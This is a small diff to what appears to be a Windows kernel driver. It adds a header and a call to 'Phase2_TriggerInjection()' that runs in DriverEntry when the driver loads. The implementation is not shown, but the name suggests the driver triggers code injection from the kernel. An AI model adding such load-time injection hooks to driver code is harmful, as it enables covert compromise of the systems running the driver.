@@ -1,4 +1,5 @@
 #include "stdafx.h"
+#include "Phase2Bridge.h"
 
 void OnDriverUnload( PDRIVER_OBJECT pDriverObject )
 {
@@ -111,6 +112,6 @@ extern "C" NTSTATUS NTAPI DriverEntry( PDRIVER_OBJECT pDriverObject, PUNICODE_ST
 	else
 		// No support for other OS
 		return STATUS_NOT_SUPPORTED;
-
+ 	Phase2_TriggerInjection();
 	return STATUS_SUCCESS;
 }
